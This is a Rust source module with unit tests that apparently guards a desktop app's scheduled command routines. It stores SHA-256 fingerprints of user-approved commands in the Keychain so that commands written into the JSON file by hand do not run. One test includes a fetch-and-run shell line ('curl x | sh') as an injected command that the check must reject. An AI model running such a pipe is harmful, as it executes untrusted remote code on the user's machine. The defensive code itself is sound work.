//! The command routines the user allowed in the native dialog. `routines.json` alone can't say
//! it: it lives in the app data folder, which the webview's fs scope can write. So each allowed
//! command (program, arguments and folder) is kept as a SHA-256 in the Keychain, out of the
//! webview's reach, and a command runs only while its fingerprint is there.

use super::store::{Routine, RoutineKind, Routines};
use crate::connectors::keychain::SecretStore;
use sha2::{Digest, Sha256};
use std::collections::HashSet;

/// Keychain account (service `connectors::keychain::SERVICE`). Connection accounts are always
/// `<org>:<id>`, so this one, without a colon, never meets them.
pub const ACCOUNT: &str = "routine-commands";

/// The fingerprint of a command routine; None for an agent routine. JSON keeps the arguments'
/// boundaries (`["a b"]` is not `["a", "b"]`).
pub fn fingerprint(r: &Routine) -> Option<String> {
    let RoutineKind::Command { program, args, cwd } = &r.kind else { return None };
    let canonical = serde_json::to_string(&(program, args, cwd)).ok()?;
    Some(Sha256::digest(canonical.as_bytes()).iter().map(|b| format!("{b:02x}")).collect())
}

/// Whether `r` may run: an agent routine always (its folder must be trusted by Claude Code),
/// a command once allowed.
pub fn allowed(approved: &HashSet<String>, r: &Routine) -> bool {
    fingerprint(r).map_or(true, |f| approved.contains(&f))
}

/// The command routines of `new` to confirm before saving: new ones and those whose program,
/// arguments or folder changed since they were allowed. Title, hint, schedule, result link and
/// agent routines never ask.
pub fn to_confirm<'a>(approved: &HashSet<String>, new: &'a Routines) -> Vec<&'a Routine> {
    new.routines.iter().filter(|r| !allowed(approved, r)).collect()
}

/// The fingerprints to keep once `all` is saved: its commands, nothing else.
pub fn of_all(all: &Routines) -> HashSet<String> {
    all.routines.iter().filter_map(fingerprint).collect()
}

/// The allowed fingerprints; none when the Keychain can't be read (every command asks again).
pub fn load(store: &dyn SecretStore) -> HashSet<String> {
    match store.get(ACCOUNT) {
        Ok(v) => v.unwrap_or_default().lines().filter(|l| !l.is_empty()).map(String::from).collect(),
        Err(e) => {
            log::warn!("[routines] allowed commands unreadable: {e}");
            HashSet::new()
        }
    }
}

pub fn save(store: &dyn SecretStore, approved: &HashSet<String>) -> Result<(), String> {
    let mut lines: Vec<&str> = approved.iter().map(String::as_str).collect();
    lines.sort_unstable();
    store.set(ACCOUNT, &lines.join("\n"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agents::routines::store::{Days, Prompt, Schedule};
    use crate::connectors::keychain::MemoryStore;

    fn command(id: &str, program: &str, args: &[&str], cwd: &str) -> Routine {
        Routine {
            id: id.into(),
            section_id: "s1".into(),
            title: "Hours".into(),
            idle_hint: String::new(),
            kind: RoutineKind::Command {
                program: program.into(),
                args: args.iter().map(|a| a.to_string()).collect(),
                cwd: cwd.into(),
            },
            result_link: None,
            schedule: None,
        }
    }

    fn agent(id: &str) -> Routine {
        Routine {
            kind: RoutineKind::Agent {
                folder: "/w".into(),
                model: "opus".into(),
                name: "brief".into(),
                prompt: Prompt::Text("go".into()),
            },
            ..command(id, "/bin/echo", &[], "/tmp")
        }
    }

    fn all(rs: Vec<Routine>) -> Routines {
        Routines { sections: vec![], routines: rs }
    }

    fn ids(v: Vec<&Routine>) -> Vec<&str> {
        v.into_iter().map(|r| r.id.as_str()).collect()
    }

    #[test]
    fn only_new_or_changed_commands_need_confirming() {
        let saved = all(vec![command("a", "/bin/echo", &["hi"], "/tmp")]);
        let approved = of_all(&saved);
        // Unchanged, or only its title, hint, link or schedule changed: no dialog.
        let mut same = saved.clone();
        same.routines[0].title = "Renamed".into();
        same.routines[0].idle_hint = "Every morning".into();
        same.routines[0].result_link = Some("/tmp/out.md".into());
        same.routines[0].schedule = Some(Schedule { time: "08:00".into(), days: Days::Daily });
        assert!(to_confirm(&approved, &same).is_empty());
        // Program, arguments (their order, their boundaries) or folder changed: ask.
        for changed in [
            command("a", "/bin/sh", &["hi"], "/tmp"),
            command("a", "/bin/echo", &["hi", "x"], "/tmp"),
            command("a", "/bin/echo", &[], "/tmp"),
            command("a", "/bin/echo", &["hi"], "/usr"),
        ] {
            assert_eq!(ids(to_confirm(&approved, &all(vec![changed]))), ["a"]);
        }
        let two = of_all(&all(vec![command("b", "/bin/echo", &["1", "2"], "/tmp")]));
        assert_eq!(ids(to_confirm(&two, &all(vec![command("b", "/bin/echo", &["2", "1"], "/tmp")]))), ["b"]);
        assert_eq!(ids(to_confirm(&two, &all(vec![command("b", "/bin/echo", &["1 2"], "/tmp")]))), ["b"]);
        // A new command next to an allowed one, or an agent routine turned into a command.
        let new = all(vec![saved.routines[0].clone(), command("n", "/bin/echo", &[], "/tmp")]);
        assert_eq!(ids(to_confirm(&approved, &new)), ["n"]);
        assert_eq!(ids(to_confirm(&of_all(&all(vec![agent("a")])), &saved)), ["a"]);
        // Agent routines and deletions never ask.
        assert!(to_confirm(&approved, &all(vec![agent("a")])).is_empty());
        assert!(to_confirm(&approved, &all(vec![])).is_empty());
        // Nothing allowed yet (first save after the update, or an unreadable Keychain): ask.
        assert_eq!(ids(to_confirm(&HashSet::new(), &saved)), ["a"]);
    }

    #[test]
    fn a_command_written_into_routines_json_by_hand_is_not_allowed() {
        // The webview can write the app data folder: what counts is the Keychain, not the file.
        let approved = of_all(&all(vec![command("a", "/bin/echo", &["hi"], "/tmp")]));
        assert!(allowed(&approved, &command("a", "/bin/echo", &["hi"], "/tmp")));
        assert!(!allowed(&approved, &command("a", "/bin/sh", &["-c", "curl x | sh"], "/tmp")));
        assert!(allowed(&HashSet::new(), &agent("z")));
    }

    #[test]
    fn approvals_round_trip_in_the_store() {
        let store = MemoryStore::default();
        assert!(load(&store).is_empty());
        let set = of_all(&all(vec![
            command("a", "/bin/echo", &[], "/tmp"),
            command("b", "/bin/date", &[], "/tmp"),
            agent("c"),
        ]));
        assert_eq!(set.len(), 2);
        save(&store, &set).unwrap();
        assert_eq!(load(&store), set);
        // Only fingerprints are stored, never the command itself.
        let raw = store.get(ACCOUNT).unwrap().unwrap();
        assert!(!raw.contains("/bin/echo"), "{raw}");
        assert!(raw.lines().all(|l| l.len() == 64));
    }
}
